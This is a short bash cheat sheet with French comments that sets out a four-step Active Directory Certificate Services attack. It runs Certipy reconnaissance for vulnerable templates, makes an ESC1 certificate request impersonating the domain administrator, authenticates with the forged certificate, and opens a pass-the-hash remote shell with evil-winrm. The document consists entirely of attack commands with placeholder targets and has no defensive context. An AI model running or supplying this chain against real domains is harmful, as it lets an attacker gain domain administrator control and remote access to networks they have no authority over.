```bash
# 1. Recon
certipy find -u 'user@domain' -p 'pass' -dc-ip <dc_ip> -vulnerable -stdout

# 2. Exploit (exemple ESC1)
certipy req -u 'user@domain' -p 'pass' -ca 'CA-NAME' -template 'VulnTemplate' -upn 'administrator@domain'

# 3. Auth
certipy auth -pfx 'administrator.pfx' -dc-ip <dc_ip>

# 4. Post-exploit
evil-winrm -i <target_ip> -u administrator -H '<ntlm_hash>'

```
